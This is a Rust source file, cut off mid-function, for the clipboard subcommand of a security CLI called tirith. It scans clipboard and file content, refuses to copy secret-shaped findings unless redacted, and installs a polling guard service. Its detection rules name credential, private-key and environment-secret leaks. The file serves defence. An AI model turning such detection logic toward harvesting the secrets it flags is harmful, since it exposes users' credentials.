//! `tirith clipboard` — read/write/scan/guard the system clipboard (M7 ch3).
//!
//! Actions: `copy <file>` (refuses High-severity content unless `--redact`),
//! `scan` (run the paste pipeline over the current clipboard), `guard
//! install-service|uninstall-service|status` (manage the OS service unit), and
//! `daemon --foreground` (the polling loop; the service's `ExecStart`, hidden from help).
//!
//! We ship only the launchd/systemd path (not a shell-profile `&`), which would orphan
//! processes and duplicate daemons with no clean-shutdown handle.
//!
//! Headless (Linux without `$DISPLAY`/`$WAYLAND_DISPLAY`, Windows session 0) yields
//! `ClipboardError::NoBackend`, rendered as a soft envelope and exit 0 so CI doesn't fail.

use std::fs;
use std::io::Write;
use std::path::{Path, PathBuf};
use std::time::Duration;

use tirith_core::clipboard::{read_clipboard_text, write_clipboard_text, ClipboardError};
use tirith_core::engine::{self, AnalysisContext};
use tirith_core::extract::ScanContext;
use tirith_core::output;
use tirith_core::redact::{redact_for_audience_with_custom, ShareAudience};
use tirith_core::tokenize::ShellType;
use tirith_core::verdict::{RuleId, Severity};

/// Max file size for `tirith clipboard copy` — matches `tirith paste`'s 1 MiB cap.
const MAX_COPY_BYTES: u64 = 1024 * 1024;

/// Daemon poll interval (short enough to catch copy→paste, idle CPU near zero).
const POLL_INTERVAL: Duration = Duration::from_secs(2);

/// Audit-debounce window: one entry per distinct content per minute (spec).
const DEBOUNCE_WINDOW: Duration = Duration::from_secs(60);

/// Scan / no-backend envelope. `status` is the machine-readable signal
/// (`"ok"` / `"no_backend"` / `"empty"`).
#[derive(serde::Serialize)]
struct ScanEnvelope<'a> {
    status: &'a str,
    #[serde(skip_serializing_if = "Option::is_none")]
    verdict: Option<&'a tirith_core::verdict::Verdict>,
    #[serde(skip_serializing_if = "Option::is_none")]
    error: Option<&'a str>,
}

/// `guard status` JSON envelope.
#[derive(serde::Serialize)]
struct GuardStatusEnvelope<'a> {
    platform: &'a str,
    unit_path: Option<String>,
    installed: bool,
    loaded: bool,
}

/// `guard install-service` JSON envelope (printed with --apply).
#[derive(serde::Serialize)]
struct GuardInstallEnvelope<'a> {
    platform: &'a str,
    unit_path: Option<String>,
    written: bool,
    loaded: bool,
}

/// Read `path`, run a paste-context analyze; refuse on a High-severity finding unless
/// `redact` is set (then apply the audience-aware redactor and copy the sanitized content).
/// Exit code: 0 copied, 1 refused / I/O failure / no clipboard backend.
pub fn copy(path: &Path, redact: bool, audience: Option<&str>, json: bool) -> i32 {
    let input = match read_file_capped(path) {
        Ok(s) => s,
        Err(code) => return code,
    };

    // A local file being copied is NOT a recorded web paste, so forbid the sidecar read
    // (`AbsentOrInvalid`) — else a hash-match against `clipboard_source.json` could
    // spuriously fire `PasteSourceMismatch`.
    let (verdict, custom_patterns) = analyze_as_paste_with_patterns(
        &input,
        tirith_core::clipboard::ClipboardSourceState::AbsentOrInvalid,
    );
    let has_high = has_blocking_findings(&verdict);

    if has_high && !redact {
        let secret_shaped = verdict.findings.iter().any(|finding| {
            matches!(
                finding.rule_id,
                RuleId::CredentialInText
                    | RuleId::HighEntropySecret
                    | RuleId::PrivateKeyExposed
                    | RuleId::SensitiveEnvExport
            )
        });
        let refusal = if secret_shaped {
            "secret-shaped content detected; clipboard write refused; use --redact to attempt a sanitized copy (unrelated blockers remain refused)"
        } else {
            "blocking content detected; clipboard write refused"
        };
        if json {
            let display = clipboard_display_verdict(&verdict, &custom_patterns);
            let env = ScanEnvelope {
                status: "refused",
                verdict: Some(&display),
                error: Some(refusal),
            };
            write_json_or_complain(&env);
        } else {
            eprintln!("tirith clipboard copy: {refusal}");
        }
        return 1;
    }

    let to_copy: String;
    let mut redact_summary: Option<String> = None;
    if redact {
        let aud = match audience {
            Some(a) => match ShareAudience::parse_cli(a) {
                Some(a) => a,
                None => {
                    eprintln!(
                        "tirith clipboard copy: invalid audience '{a}' (expected one of: {})",
                        ShareAudience::cli_values().join(", ")
                    );
                    return 2;
                }
            },
            // --redact without --audience defaults to `generic` (the M7 ch2 safe default).
            None => ShareAudience::Generic,
        };
        match prepare_redacted_copy(&input, aud, &custom_patterns) {
            Ok((content, summary)) => {
                redact_summary = Some(summary);
                to_copy = content;
            }
            Err(refusal) => {
                if json {
                    // Reuse the exact policy snapshot returned with the
                    // post-redaction analysis. Never rediscover policy merely
                    // to render the refusal.
                    let display = clipboard_display_verdict(
                        refusal.verdict.as_ref(),
                        &refusal.custom_patterns,
                    );
                    let env = ScanEnvelope {
                        status: "refused",
                        verdict: Some(&display),
                        error: Some("blocking content remains after redaction"),
                    };
                    write_json_or_complain(&env);
                } else {
                    eprintln!(
                        "tirith clipboard copy: blocking content remains after redaction; clipboard write refused"
                    );
                }
                return 1;
            }
        }
    } else {
        to_copy = input;
    }

    match write_clipboard_text(&to_copy) {
        Ok(()) => {
            if json {
                let env = serde_json::json!({
                    "status": "copied",
                    "bytes": to_copy.len(),
                    "redacted": redact,
                    "redactions_summary": redact_summary,
                });
                let mut stdout = std::io::stdout().lock();
                if serde_json::to_writer_pretty(&mut stdout, &env).is_err()
                    || writeln!(stdout).is_err()
                {
                    eprintln!("tirith clipboard copy: failed to write JSON output");
                    return 1;
                }
            } else {
                eprintln!(
                    "tirith clipboard copy: copied {} bytes to clipboard",
                    to_copy.len()
                );
                if let Some(s) = redact_summary {
                    eprintln!("tirith clipboard copy: redactions: {s}");
                }
            }
            0
        }
        Err(ClipboardError::NoBackend) => {
            emit_no_backend(json, "copy");
            1
        }
        Err(e) => {
            eprintln!("tirith clipboard copy: {e}");
            1
        }
    }
}

fn has_blocking_findings(verdict: &tirith_core::verdict::Verdict) -> bool {
    verdict
        .findings
        .iter()
        .any(|finding| finding.severity >= Severity::High)
}

/// Apply the clipboard redactor and then re-run the exact paste analysis over
/// the bytes that would be written. Redaction is an override only when it
/// actually removes every blocking finding; it can never waive an unrelated
/// command, prompt-injection, or executable-content verdict.
fn prepare_redacted_copy(
    input: &str,
    audience: ShareAudience,
    custom_patterns: &[String],
) -> Result<(String, String), RedactedCopyRefusal> {
    let report = redact_for_audience_with_custom(input, audience, custom_patterns);
    let (post_redaction_verdict, post_redaction_patterns) = analyze_as_paste_with_patterns(
        &report.redacted_content,
        tirith_core::clipboard::ClipboardSourceState::AbsentOrInvalid,
    );
    if has_blocking_findings(&post_redaction_verdict) {
        return Err(RedactedCopyRefusal {
            verdict: Box::new(post_redaction_verdict),
            custom_patterns: post_redaction_patterns,
        });
    }

    let summary = if report.redactions.is_empty() {
        "no redactions applied".to_string()
    } else {
        report
            .redactions
            .iter()
            .map(|row| format!("{} {}", row.count, row.label))
            .collect::<Vec<_>>()
            .join(", ")
    };
    Ok((report.redacted_content, summary))
}

struct RedactedCopyRefusal {
    verdict: Box<tirith_core::verdict::Verdict>,
    custom_patterns: Vec<String>,
}

/// Read the current clipboard, run the paste pipeline, print the verdict. Exit codes
/// match `tirith paste` (0 Allow, 1 Block, 2 Warn); the `--json` `status` field
/// distinguishes the no-backend / empty paths from a real verdict.
pub fn scan(json: bool) -> i32 {
    match read_clipboard_text() {
        Ok(Some(text)) if !text.is_empty() => {
            // Actual clipboard content: the sidecar legitimately describes it, so `Unread`
            // lets the engine consult `clipboard_source.json` for attribution.
            let (verdict, custom_patterns) = analyze_as_paste_with_patterns(
                &text,
                tirith_core::clipboard::ClipboardSourceState::Unread,
            );
            let display = clipboard_display_verdict(&verdict, &custom_patterns);
            if json {
                let env = ScanEnvelope {
                    status: "ok",
                    verdict: Some(&display),
                    error: None,
                };
                write_json_or_complain(&env);
            } else if output::write_human_auto_with_patterns(&verdict, false, &custom_patterns)
                .is_err()
            {
                eprintln!("tirith clipboard scan: failed to write output");
            }
            verdict.action.exit_code()
        }
        Ok(_) => {
            // Empty or non-text payload — soft-pass, exit 0.
            if json {
                let env = ScanEnvelope {
                    status: "empty",
                    verdict: None,
                    error: None,
                };
                write_json_or_complain(&env);
            } else {
                eprintln!(
                    "tirith clipboard scan: clipboard is empty (or carries non-text content)"
                );
            }
            0
        }
        Err(ClipboardError::NoBackend) => {
            emit_no_backend(json, "scan");
            // Exit 0: a missing backend is a soft-degrade, not a failure (CI / SSH).
            0
        }
        Err(e) => {
            if json {
                let msg = e.to_string();
                let env = ScanEnvelope {
                    status: "error",
                    verdict: None,
                    error: Some(&msg),
                };
                write_json_or_complain(&env);
            } else {
                eprintln!("tirith clipboard scan: {e}");
            }
            1
        }
    }
}

/// Print (and on `apply=true` write) the OS-correct service unit.
/// macOS → LaunchAgent plist + `launchctl load`; Linux → systemd-user unit +
/// `systemctl --user enable --now`; Windows → unsupported (print guidance).
pub fn install_service(apply: bool, json: bool) -> i32 {
    let platform = service_platform();
    let unit_path = service_unit_path();
    let unit_content = match render_service_unit() {
        Some(s) => s,
        None => {
            // Windows: foreground only.
            if json {
                let env = GuardInstallEnvelope {
                    platform,
                    unit_path: None,
                    written: false,
                    loaded: false,
                };
                write_json_or_complain(&env);
            } else {
                eprintln!(
                    "tirith clipboard guard install-service: service-mode clipboard guard is not supported on Windows.\n  Run `tirith clipboard daemon --foreground` in a long-running terminal instead.",
                );
            }
            return 1;
        }
    };

    if !apply {
        // Dry-run: print the unit content (JSON mode wraps it in the envelope).
        if json {
            let env = serde_json::json!({
                "platform": platform,
                "unit_path": unit_path.as_ref().map(|p| p.display().to_string()),
                "written": false,
                "unit_content": unit_content,
            });
            let mut stdout = std::io::stdout().lock();
            if serde_json::to_writer_pretty(&mut stdout, &env).is_err() || writeln!(stdout).is_err()
            {
                eprintln!("tirith clipboard guard: failed to write JSON output");
                return 1;
            }
        } else {
            if let Some(p) = unit_path.as_ref() {
                eprintln!(
                    "tirith clipboard guard install-service: dry-run; would write to {}",
                    p.display()
                );
                eprintln!("tirith clipboard guard install-service: rerun with --apply to install.");
            }
            print!("{unit_content}");
        }
        return 0;
    }

    // --apply: write the unit, then load it.
    let path = match unit_path.as_ref() {
        Some(p) => p,
        None => {
            // Defensive: render returned Some but path resolved None — treat as unsupported.
            eprintln!(
                "tirith clipboard guard install-service: no unit path resolved for this platform"
            );
            return 1;
        }
    };

    // Idempotency: write only when on-disk content differs (or fails to read), then load.
    let needs_write = !matches!(fs::read_to_string(path), Ok(existing) if existing == unit_content);

    if needs_write {
        if let Some(parent) = path.parent() {
            if let Err(e) = fs::create_dir_all(parent) {
                eprintln!(
                    "tirith clipboard guard install-service: failed to create {}: {e}",
                    parent.display()
                );
                return 1;
            }
        }
        // macOS: ensure ~/Library/Logs exists so launchd doesn't EACCES on the plist's
        // StandardOutPath / StandardErrorPath. (No-op on Linux — systemd uses journald.)
        #[cfg(target_os = "macos")]
        {
            if let Ok(home) = std::env::var("HOME") {
                let log_dir = PathBuf::from(home).join("Library/Logs");
                let _ = fs::create_dir_all(&log_dir);
            }
        }
        if let Err(e) = fs::write(path, &unit_content) {
            eprintln!(
                "tirith clipboard guard install-service: failed to write {}: {e}",
                path.display()
            );
            return 1;
        }
    }

    let loaded = load_service();

    if json {
        let env = GuardInstallEnvelope {
            platform,
            unit_path: Some(path.display().to_string()),
            written: needs_write,
            loaded,
        };
        write_json_or_complain(&env);
    } else {
        if needs_write {
            eprintln!(
                "tirith clipboard guard install-service: wrote {}",
                path.display()
            );
        } else {
            eprintln!(
                "tirith clipboard guard install-service: {} already up to date",
                path.display()
            );
        }
        if loaded {
            eprintln!("tirith clipboard guard install-service: service loaded");
        } else {
            eprintln!(
                "tirith clipboard guard install-service: warning — could not confirm service load (see platform docs)"
            );
        }
    }
    0
}

/// Remove the service unit and unload it.
pub fn uninstall_service(json: bool) -> i32 {
    let platform = service_platform();
    let unit_path = match service_unit_path() {
        Some(p) => p,
        None => {
            eprintln!("tirith clipboard guard uninstall-service: not supported on this platform");
            return 1;
        }
    };

    let _ = unload_service();
    let removed = if unit_path.exists() {
        fs::remove_file(&unit_path).is_ok()
    } else {
        false
    };

    if json {
        let env = serde_json::json!({
            "platform": platform,
            "unit_path": unit_path.display().to_string(),
            "removed": removed,
        });
        write_json_or_complain(&env);
    } else if removed {
        eprintln!(
            "tirith clipboard guard uninstall-service: removed {}",
            unit_path.display()
        );
    } else {
        eprintln!(
            "tirith clipboard guard uninstall-service: nothing to remove (unit not present at {})",
            unit_path.display()
        );
    }
    0
}

/// Report whether the service unit is installed and loaded.
pub fn status(json: bool) -> i32 {
    let platform = service_platform();
    let unit_path = service_unit_path();
    let installed = unit_path.as_ref().map(|p| p.exists()).unwrap_or(false);
    let loaded = is_service_loaded();

    if json {
        let env = GuardStatusEnvelope {
            platform,
            unit_path: unit_path.as_ref().map(|p| p.display().to_string()),
            installed,
            loaded,
        };
        write_json_or_complain(&env);
    } else {
        match unit_path.as_ref() {
            Some(p) => eprintln!(
                "tirith clipboard guard status: platform={platform}, unit={}, installed={installed}, loaded={loaded}",
                p.display()
            ),
            None => eprintln!(
                "tirith clipboard guard status: platform={platform} (service-mode not supported); use `tirith clipboard daemon --foreground`"
            ),
        }
    }
    0
}

/// The polling loop. Reads the clipboard every `POLL_INTERVAL`; on secret-shaped content,
/// warns on stderr and writes an audit entry, debounced by content SHA-256 within a 60s
/// window. Never returns (the service manager owns lifecycle; Ctrl-C ends `--foreground`).
/// In JSON mode each event is one line of JSON for a log forwarder.
pub fn daemon_foreground(json: bool) -> i32 {
    use std::collections::HashMap;
    use std::time::Instant;

    // content_sha256_hex → last seen, for debounce.
    let mut seen: HashMap<String, Instant> = HashMap::new();

    // Sev-5 silent-failure fix: rate-limit persistent read errors (one stderr line per
    // minute per distinct message) so a stuck-error daemon surfaces instead of failing quietly.
    let mut last_logged_error: HashMap<String, Instant> = HashMap::new();
    const ERROR_LOG_RATE: std::time::Duration = std::time::Duration::from_secs(60);

    // First read: announce liveness on stderr/JSON.
    if json {
        let env = serde_json::json!({
            "event": "daemon_start",
            "poll_interval_ms": POLL_INTERVAL.as_millis() as u64,
            "debounce_window_ms": DEBOUNCE_WINDOW.as_millis() as u64,
        });
        let _ = println_json(&env);
    } else {
        eprintln!(
            "tirith clipboard daemon: polling every {}s; debounce {}s",
            POLL_INTERVAL.as_secs(),
            DEBOUNCE_WINDOW.as_secs()
        );
    }

    loop {
        std::thread::sleep(POLL_INTERVAL);

        let text = match read_clipboard_text() {
            Ok(Some(t)) if !t.is_empty() => t,
            Ok(_) => continue,
            Err(ClipboardError::NoBackend) => {
                // Headless: sleep longer to avoid burning CPU on a doomed retry.
                std::thread::sleep(POLL_INTERVAL * 30);
                continue;
            }
            Err(e) => {
                // Rate-limited so a persistent failure surfaces without spamming the journal.
                let key = e.to_string();
                let now_inst = Instant::now();
                let should_log = last_logged_error
                    .get(&key)
                    .map(|prev| now_inst.duration_since(*prev) >= ERROR_LOG_RATE)
                    .unwrap_or(true);
                if should_log {
                    last_logged_error.insert(key.clone(), now_inst);
                    if json {
                        let env = serde_json::json!({
                            "event": "clipboard_read_error",
                            "error": key,
                        });
                        let _ = println_json(&env);
                    } else {
                        eprintln!("tirith clipboard daemon: read error: {key}");
                    }
                }
                last_logged_error.retain(|_, t| now_inst.duration_since(*t) < ERROR_LOG_RATE * 5);
                continue;
            }
        };

        let hash = sha256_hex(text.as_bytes());

        // Debounce: drop if we've seen this content within the window.
        let now = Instant::now();
        if let Some(last) = seen.get(&hash) {
            if now.duration_since(*last) < DEBOUNCE_WINDOW {
                continue;
            }
        }
        // GC entries older than 5× the window so the map stays bounded.
        seen.retain(|_, t| now.duration_since(*t) < DEBOUNCE_WINDOW * 5);
        seen.insert(hash.clone(), now);

        // Actual clipboard content (like `scan`): `Unread` lets the engine consult
        // `clipboard_source.json` for attribution.
        let (verdict, custom_patterns) = analyze_as_paste_with_patterns(
            &text,
            tirith_core::clipboard::ClipboardSourceState::Unread,
        );
        let has_high = verdict
            .findings
            .iter()
            .any(|f| f.severity >= Severity::High);

        if !has_high {
            continue;
        }

        // Audit + stderr warn. Silent-failure fix: a swallowed audit-write failure left
        // `tirith last-trigger <event_id>` empty, so match the result and warn on failure.
        let event_id = uuid::Uuid::new_v4().to_string();
        // Audit with the exact custom-DLP plan returned by the same analysis;
        // rediscovery here would split decision and persistence across policy
        // snapshots.
        if let Err(e) = tirith_core::audit::log_verdict(
            &verdict,
            &text,
            None,
            Some(event_id.clone()),
            &custom_patterns,
        ) {
            eprintln!("tirith clipboard daemon: audit log write failed (event_id={event_id}): {e}");
        }

        if json {
            let env = serde_json::json!({
                "event": "secret_in_clipboard",
                "event_id": event_id,
                "rule_ids": verdict
                    .findings
                    .iter()
                    .map(|f| f.rule_id.to_string())
                    .collect::<Vec<_>>(),
                "content_sha256": hash,
            });
            let _ = println_json(&env);
        } else {
            eprintln!(
                "tirith clipboard daemon: secret-shaped content detected on clipboard (event_id={event_id}); see `tirith audit stats` / `tirith last-trigger`"
            );
        }
    }
}

/// Poll the clipboard and report the attributed source URL each time the companion
/// browser extension records a NEW source whose content hash matches the clipboard.
///
/// The extension writes `state_dir()/clipboard_source.json` when it sets the clipboard;
/// we watch its mtime and, when it advances AND `sha256(clipboard) == record.content_sha256`,
/// print the source. No-op without the extension. Never returns (Ctrl-C ends); `--json`
/// emits one line per attribution.
pub fn watch(json: bool) -> i32 {
    use std::time::SystemTime;

    let Some(source_path) = tirith_core::clipboard::source_file_path() else {
        eprintln!("tirith clipboard watch: cannot resolve the tirith state directory");
        return 1;
    };
    // One policy discovery and one compiled custom-DLP plan for the entire
    // watcher lifetime. Start metadata and every later provenance record use
    // this same frozen plan rather than silently changing projection policy
    // between events.
    let provenance_dlp = discover_watch_dlp_with(|| tirith_core::policy::Policy::discover(None));

    if json {
        let env = watch_start_json(&source_path, &provenance_dlp);
        // Broken pipe (no reader): exit cleanly rather than poll forever. Same below.
        if println_json(&env).is_err() {
            return 0;
        }
    } else if write_watch_start_human(std::io::stderr().lock(), &source_path, &provenance_dlp)
        .is_err()
    {
        return 0;
    }

    // Last record mtime acted on, so we report once per extension write, not per poll.
    let mut last_mtime: Option<SystemTime> = None;

    loop {
        std::thread::sleep(POLL_INTERVAL);

        let mtime = match std::fs::metadata(&source_path).and_then(|m| m.modified()) {
            Ok(t) => t,
            Err(_) => continue,
        };
        // Act only when the record is NEWER than the one we last reported.
        if last_mtime == Some(mtime) {
            continue;
        }

        let Some(record) = tirith_core::clipboard::read_source_record_at(&source_path) else {
            // Present but unreadable — advance the marker so we don't re-read it every poll.
            last_mtime = Some(mtime);
            continue;
        };
        let clip = match read_clipboard_text() {
            Ok(Some(t)) if !t.is_empty() => t,
            Ok(_) => {
                last_mtime = Some(mtime);
                continue;
            }
            Err(ClipboardError::NoBackend) => {
                std::thread::sleep(POLL_INTERVAL * 30);
                continue;
            }
            Err(_) => {
                // Transient read failure: do NOT advance `last_mtime`, retry next poll.
                continue;
            }
        };

        // Attribute only when the clipboard content matches the recorded hash.
        let actual = sha256_hex(clip.as_bytes());
        last_mtime = Some(mtime);
        if !actual.eq_ignore_ascii_case(record.content_sha256.trim()) {
            // Record describes a different payload (race / replaced) — no attribution.
            continue;
        }

        if json {
            let env = watch_source_json(&record, &provenance_dlp);
            // Broken pipe → no consumer; exit cleanly (mirrors watch_start).
            if println_json(&env).is_err() {
                return 0;
            }
        } else {
            // Human mode: broken pipe → reader gone, stop. One invocation-level
            // writer owns the full record and its truncation marker.
            if write_watch_source_human(std::io::stdout().lock(), &record, &provenance_dlp).is_err()
            {
                return 0;
            }
        }
    }
}

fn discover_watch_dlp_with(
    discover: impl FnOnce() -> tirith_core::policy::Policy,
) -> tirith_core::redact::CompiledCustomPatterns {
    // `Policy::discover` is authoritative: remote replacement policy and
    // runtime overrides are included. The injectable closure makes the
    // exactly-once/final-pattern contract testable without network access.
    let policy = discover();
    tirith_core::redact::CompiledCustomPatterns::new_silent(&policy.dlp_custom_patterns)
}

fn watch_start_json(
    source_path: &Path,
    compiled: &tirith_core::redact::CompiledCustomPatterns,
) -> serde_json::Value {
    let source_file = crate::cli::sanitize_provenance_text_with_compiled(
        &source_path.display().to_string(),
        compiled,
    );
    tirith_core::verdict::bound_json_value_for_output(serde_json::json!({
        "event": "watch_start",
        "source_file": source_file,
        "poll_interval_ms": POLL_INTERVAL.as_millis() as u64,
    }))
}

fn watch_source_json(
    record: &tirith_core::clipboard::ClipboardSourceRecord,
    compiled: &tirith_core::redact::CompiledCustomPatterns,
) -> serde_json::Value {
    tirith_core::verdict::bound_json_value_for_output(serde_json::json!({
        "event": "clipboard_source",
        "source_url": crate::cli::sanitize_provenance_url_with_compiled(&record.source_url, compiled),
        "source_title": crate::cli::sanitize_provenance_text_with_compiled(&record.source_title, compiled),
        "hidden_text_detected": record.hidden_text_detected,
    }))
}

fn write_watch_start_human(
    writer: impl Write,
    source_path: &Path,
    compiled: &tirith_core::redact::CompiledCustomPatterns,
) -> std::io::Result<()> {
    let mut output = output::HumanInvocationWriter::new(writer, false);
    let source_file = crate::cli::sanitize_provenance_text_with_compiled(
        &source_path.display().to_string(),
        compiled,
    );
    writeln!(
        output,
        "tirith clipboard watch: watching {source_file} (polling every {}s); attributes the clipboard to its browser source",
        POLL_INTERVAL.as_secs()
    )?;
    output.finish()
}

fn write_watch_source_human(
    writer: impl Write,
    record: &tirith_core::clipboard::ClipboardSourceRecord,
    compiled: &tirith_core::redact::CompiledCustomPatterns,
) -> std::io::Result<()> {
    let mut output = output::HumanInvocationWriter::new(writer, false);
    let source_url =
        crate::cli::sanitize_provenance_url_with_compiled(&record.source_url, compiled);
    let source_title =
        crate::cli::sanitize_provenance_text_with_compiled(&record.source_title, compiled);
    write!(
        output,
        "tirith clipboard watch: clipboard source: {source_url}"
    )?;
    if !source_title.is_empty() {
        write!(output, " — {source_title}")?;
    }
    if record.hidden_text_detected {
        write!(output, " [hidden text detected]")?;
    }
    writeln!(output)?;
    output.finish()
}

/// Run the engine in paste context over `input` (used by `copy`, `scan`, `daemon`).
///
/// The caller threads `clipboard_source` rather than hardcoding it: it controls whether
/// the engine MAY consult the paste sidecar. Actual-clipboard paths (`scan`, `daemon`) pass
/// `Unread` (the sidecar describes the clipboard); `copy` analyzes a LOCAL FILE and passes
/// `AbsentOrInvalid` to forbid the read, else a hash-match would spuriously fire
/// `PasteSourceMismatch`.
#[cfg(test)]
fn analyze_as_paste(
    input: &str,
    clipboard_source: tirith_core::clipboard::ClipboardSourceState,
) -> tirith_core::verdict::Verdict {
    analyze_as_paste_with_patterns(input, clipboard_source).0
}

fn analyze_as_paste_with_patterns(
    input: &str,
    clipboard_source: tirith_core::clipboard::ClipboardSourceState,
) -> (tirith_core::verdict::Verdict, Vec<String>) {
    let raw_bytes = input.as_bytes().to_vec();
    let ctx = AnalysisContext {
        input: input.to_string(),
        shell: ShellType::Posix,
        scan_context: ScanContext::Paste,
        raw_bytes: Some(raw_bytes),
        interactive: false,
        cwd: std::env::current_dir()
            .ok()
            .map(|p| p.display().to_string()),
        file_path: None,
        repo_root: None,
        is_config_override: false,
        clipboard_html: None,
        card_ref: None,
        clipboard_source,
    };
    let (mut verdict, policy) = engine::analyze_returning_policy(&ctx);
    // Paranoia-filter against the exact policy snapshot used by analysis so the
    // clipboard path cannot mix two policy revisions.
    engine::filter_findings_by_paranoia(&mut verdict, policy.paranoia);
    // Keep the complete raw verdict for decisions and audit. External surfaces
    // derive an independently redacted and bounded clone below.
    (verdict, policy.dlp_custom_patterns)
}

fn clipboard_display_verdict(
    verdict: &tirith_core::verdict::Verdict,
    custom_patterns: &[String],
) -> tirith_core::verdict::Verdict {
    let mut display = verdict.clone();
    tirith_core::redact::redact_verdict(&mut display, custom_patterns);
    tirith_core::verdict::bound_verdict_for_output(&mut display);
    display
}

/// Read a file with a hard byte cap. Errors map to a CLI exit code.
fn read_file_capped(path: &Path) -> Result<String, i32> {
    // repo-0367: stat-then-read raced the path and followed symlinks — a
    // zero-length-reported device or a post-stat FIFO swap could block or
    // allocate past the advertised cap. One no-follow, regular-file-only,
    // capped read instead.
    let bytes = match tirith_core::util::read_text_no_follow_capped(path, MAX_COPY_BYTES) {
        Ok(b) => b,
        Err(tirith_core::util::OpenRegularError::TooLarge) => {
            eprintln!(
                "tirith clipboard copy: {} exceeds {} bytes — refusing (the clipboard isn't a blob store)",
                path.display(),
                MAX_COPY_BYTES
            );
            return Err(1);
        }
        Err(_) => {
            eprintln!(
                "tirith clipboard copy: failed to read {} (not a regular, safely-readable file)",
                path.display()
            );
            return Err(1);
        }
    };
    String::from_utf8(bytes).map_err(|_| {
        eprintln!(
            "tirith clipboard copy: {} is not valid UTF-8",
            path.display()
        );
        1
    })
}

/// Print the "no clipboard backend" envelope/notice. `verb` ("scan"/"copy") names the
/// command in stderr mode.
fn emit_no_backend(json: bool, verb: &str) {
    if json {
        let env = ScanEnvelope {
            status: "no_backend",
            verdict: None,
            error: Some("no clipboard backend available (headless display server?)"),
        };
        write_json_or_complain(&env);
    } else {
        eprintln!(
            "tirith clipboard {verb}: no clipboard backend available (headless display server?)"
        );
    }
}

/// SHA-256 hex via the shared core helper (Greptile R1 #6), so debounce key,
/// paste-provenance rule, and `--with-source` all hash content the same way.
fn sha256_hex(bytes: &[u8]) -> String {
    tirith_core::clipboard::content_sha256_hex(bytes)
}

/// Serialize `value` as a single line of JSON to stdout, followed by `\n`.
/// Used by the daemon's per-event emitter. Returns `Ok(())` on success.
fn println_json<T: serde::Serialize>(value: &T) -> std::io::Result<()> {
    let value = serde_json::to_value(value)?;
    let value = tirith_core::verdict::bound_json_value_for_output(value);
    let mut stdout = std::io::stdout().lock();
    serde_json::to_writer(&mut stdout, &value)?;
    writeln!(stdout)
}

/// Pretty-print JSON to stdout. Drops the error to stderr — callers key on the exit code.
fn write_json_or_complain<T: serde::Serialize>(value: &T) {
    let mut stdout = std::io::stdout().lock();
    let value = serde_json::to_value(value).map(tirith_core::verdict::bound_json_value_for_output);
    if value
        .as_ref()
        .map_err(|_| ())
        .and_then(|value| serde_json::to_writer_pretty(&mut stdout, value).map_err(|_| ()))
        .is_err()
        || writeln!(stdout).is_err()
    {
        eprintln!("tirith clipboard: failed to write JSON output");
    }
}

/// Short platform tag for JSON envelopes and human messages.
fn service_platform() -> &'static str {
    #[cfg(target_os = "macos")]
    {
        "macos-launchd"
    }
    #[cfg(target_os = "linux")]
    {
        "linux-systemd-user"
    }
    #[cfg(target_os = "windows")]
    {
        "windows-foreground-only"
    }
    #[cfg(not(any(target_os = "macos", target_os = "linux", target_os = "windows")))]
    {
        "unsupported"
    }
}

fn home_dir_or_none() -> Option<PathBuf> {
    home::home_dir()
}

/// Path install-service writes to. `None` on Windows / unsupported platforms.
fn service_unit_path() -> Option<PathBuf> {
    let home = home_dir_or_none()?;
    #[cfg(target_os = "macos")]
    {
        Some(home.join("Library/LaunchAgents/sh.tirith.clipboard.plist"))
    }
    #[cfg(target_os = "linux")]
    {
        Some(home.join(".config/systemd/user/tirith-clipboard.service"))
    }
    #[cfg(target_os = "windows")]
    {
        let _ = home;
        None
    }
    #[cfg(not(any(target_os = "macos", target_os = "linux", target_os = "windows")))]
    {
        let _ = home;
        None
    }
}

/// Path to the current `tirith` binary for the service's `ExecStart`; falls back to
/// the literal `"tirith"` (PATH at runtime) if `current_exe()` fails.
fn current_tirith_exe() -> String {
    std::env::current_exe()
        .ok()
        .and_then(|p| p.canonicalize().ok())
        .map(|p| p.display().to_string())
        .unwrap_or_else(|| "tirith".to_string())
}

/// Build the platform-correct service unit text. `None` on Windows.
pub(crate) fn render_service_unit() -> Option<String> {
    let exe = current_tirith_exe();

    #[cfg(target_os = "macos")]
    {
        // Code-reviewer fix #6: log to per-user `~/Library/Logs/` not world-writable
        // `/tmp` (a foreign symlink there could redirect the daemon's logs).
        let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".to_string());
        let out_log = format!("{home}/Library/Logs/sh.tirith.clipboard.out.log");
        let err_log = format!("{home}/Library/Logs/sh.tirith.clipboard.err.log");
        Some(format!(
            r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>sh.tirith.clipboard</string>
    <key>ProgramArguments</key>
    <array>
        <string>{exe}</string>
        <string>clipboard</string>
        <string>daemon</string>
        <string>--foreground</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>{out_log}</string>
    <key>StandardErrorPath</key>
    <string>{err_log}</string>
    <key>ProcessType</key>
    <string>Background</string>
</dict>
</plist>
"#
        ))
    }

    #[cfg(target_os = "linux")]
    {
        Some(format!(
            "[Unit]\n\
Description=tirith clipboard guard (M7 ch3)\n\
After=graphical-session.target\n\
PartOf=graphical-session.target\n\
\n\
[Service]\n\
Type=simple\n\
ExecStart={exe} clipboard daemon --foreground\n\
Restart=on-failure\n\
RestartSec=5\n\
\n\
[Install]\n\
WantedBy=graphical-session.target\n",
        ))
    }

    #[cfg(target_os = "windows")]
    {
        let _ = exe;
        None
    }

    #[cfg(not(any(target_os = "macos", target_os = "linux", target_os = "windows")))]
    {
        let _ = exe;
        None
    }
}

/// Load the service unit (best effort; verified by `is_service_loaded`).
fn load_service() -> bool {
    #[cfg(target_os = "macos")]
    {
        // `launchctl load -w` is the "enable+load" verb (newer `bootstrap` needs a domain target).
        let path = match service_unit_path() {
            Some(p) => p,
            None => return false,
        };
        std::process::Command::new("launchctl")
            .args(["load", "-w"])
            .arg(&path)
            .status()
            .map(|s| s.success())
            .unwrap_or(false)
    }

    #[cfg(target_os = "linux")]
    {
        // `daemon-reload` so systemd picks up the new unit, then `enable --now`.
        let _ = std::process::Command::new("systemctl")
            .args(["--user", "daemon-reload"])
            .status();
        std::process::Command::new("systemctl")
            .args(["--user", "enable", "--now", "tirith-clipboard.service"])
            .status()
